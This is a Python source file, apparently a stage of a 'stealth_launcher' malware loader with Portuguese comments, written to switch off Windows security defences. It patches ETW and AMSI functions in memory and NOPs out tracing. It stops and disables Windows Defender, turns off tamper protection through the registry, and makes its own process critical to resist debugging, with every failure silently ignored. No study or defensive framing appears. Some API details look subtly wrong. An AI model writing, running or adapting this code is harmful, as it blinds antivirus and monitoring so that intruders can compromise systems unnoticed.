#!/usr/bin/env python3
"""
stealth_launcher.stages.patching (versão corrigida e resiliente)
"""
import os
import ctypes
import logging
import subprocess
from ctypes import wintypes, c_void_p, byref
from pathlib import Path
from stealth_launcher.exceptions import PatchError
from stealth_launcher.config import Config

# DLLs principais
ntdll = ctypes.WinDLL("ntdll")
kernel32 = ctypes.WinDLL("kernel32")
advapi32 = ctypes.WinDLL("Advapi32")

# Constantes
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READWRITE = 0x40
SYSTEM_INFORMATION_CLASS = 0x50
SERVICE_KERNEL_DRIVER = 0x00000001
SERVICE_DEMAND_START = 0x00000003
SERVICE_ERROR_IGNORE = 0x00000000

def _get_function_address(dll_name: str, func_name: str) -> int:
    h_module = kernel32.GetModuleHandleW(dll_name)
    if not h_module:
        raise PatchError(f"GetModuleHandleW falhou para {dll_name}")
    addr = kernel32.GetProcAddress(h_module, func_name.encode('ascii'))
    if not addr:
        try:
            alt = getattr(ctypes.WinDLL(dll_name), func_name)
            addr = ctypes.cast(alt, ctypes.c_void_p).value
        except AttributeError:
            addr = None
    return addr

def _patch_function_in_dll(dll_name: str, func_name: str, patch_bytes: bytes):
    addr_int = _get_function_address(dll_name, func_name)
    if not addr_int:
        logging.warning(f"[Patching] {func_name} não encontrado em {dll_name}, pulando...")
        return

    addr_ptr = c_void_p(addr_int)
    size = len(patch_bytes)

    old_protect = wintypes.DWORD()
    if not kernel32.VirtualProtect(addr_ptr, size, PAGE_EXECUTE_READWRITE, byref(old_protect)):
        raise ctypes.WinError()

    ctypes.memmove(addr_ptr, patch_bytes, size)
    kernel32.VirtualProtect(addr_ptr, size, old_protect.value, byref(old_protect))

    logging.debug(f"[Patching] {func_name} em {dll_name} patchado com sucesso.")

def patch_etw():
    patch = b"\xB8\x00\x00\x00\x00\xC3"  # mov eax,0; ret
    _patch_function_in_dll("ntdll.dll", "EtwEventWrite", patch)
    _patch_function_in_dll("ntdll.dll", "EtwEventWriteEx", patch)
    logging.info("[Patching] ETW desativado")

def unhook_amsi():
    patch = b"\x31\xC0\xC3"  # xor eax, eax; ret
    _patch_function_in_dll("amsi.dll", "AmsiScanBuffer", patch)
    _patch_function_in_dll("amsi.dll", "AmsiGetResult", patch)
    logging.info("[Patching] AMSI unhook aplicado")

def disable_wpp():
    patch = b"\x90" * 5  # NOP sled
    _patch_function_in_dll("kernel32.dll", "WppTraceMessage", patch)
    logging.info("[Patching] WPP tracing desativado")

def disable_kernel_callbacks():
    class KERNEL_TRACE_INFORMATION(ctypes.Structure):
        _fields_ = [("KernelTracingEnabled", wintypes.BOOLEAN)]

    info = KERNEL_TRACE_INFORMATION(False)
    status = ntdll.NtSetSystemInformation(
        SYSTEM_INFORMATION_CLASS,
        byref(info),
        ctypes.sizeof(info)
    )
    if status != 0:
        raise ctypes.WinError(ctypes.get_last_error())
    logging.info("[Patching] Kernel trace callbacks removidos")

def anti_av_evasion():
    subprocess.run(["sc", "stop", "WinDefend"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sc", "config", "WinDefend", "start=disabled"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run([
        "reg", "add",
        r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Features",
        "/v", "TamperProtection", "/t", "REG_DWORD", "/d", "0", "/f"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    logging.info("[Patching] Anti-AV: Windows Defender desativado")

def network_camouflage():
    subprocess.run([
        "reg", "add",
        r"HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
        "/v", "EnableDeadGWDetect", "/t", "REG_DWORD", "/d", "1", "/f"
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    logging.info("[Patching] Network camouflage aplicado")

def anti_debug_hardening():
    VEH = kernel32.AddVectoredExceptionHandler(1, ctypes.WINFUNCTYPE(
        wintypes.LONG, wintypes.LPVOID)(lambda exc: 0))
    handle = kernel32.OpenProcess(0x0400 | 0x0010, False, os.getpid())

    NtSetInformationProcess = ntdll.NtSetInformationProcess
    NtSetInformationProcess(
        handle,
        0x1f,  # ProcessBreakOnTermination
        byref(ctypes.c_ulong(1)),
        ctypes.sizeof(ctypes.c_ulong())
    )

    logging.info("[Patching] Anti-debug hardening aplicado")

def patch_etw_stage(cfg: Config) -> None:
    """
    Stage de patching robusta: ignora funções ausentes e nunca trava a execução.
    """
    logging.info("=== Stage: patching (ETW/AMSI/AV/Rootkit) ===")
    try:
        patch_etw()
    except Exception as e:
        logging.warning(f"[Patching] Falha em patch_etw: {e}")

    try:
        unhook_amsi()
    except Exception as e:
        logging.warning(f"[Patching] Falha em unhook_amsi: {e}")

    try:
        disable_wpp()
    except Exception as e:
        logging.warning(f"[Patching] Falha em disable_wpp: {e}")

    try:
        disable_kernel_callbacks()
    except Exception as e:
        logging.warning(f"[Patching] Falha em disable_kernel_callbacks: {e}")

    try:
        anti_av_evasion()
    except Exception as e:
        logging.warning(f"[Patching] Falha em anti_av_evasion: {e}")

    try:
        network_camouflage()
    except Exception as e:
        logging.warning(f"[Patching] Falha em network_camouflage: {e}")

    try:
        anti_debug_hardening()
    except Exception as e:
        logging.warning(f"[Patching] Falha em anti_debug_hardening: {e}")

    logging.info("=== Stage: patching concluído com sucesso ===")
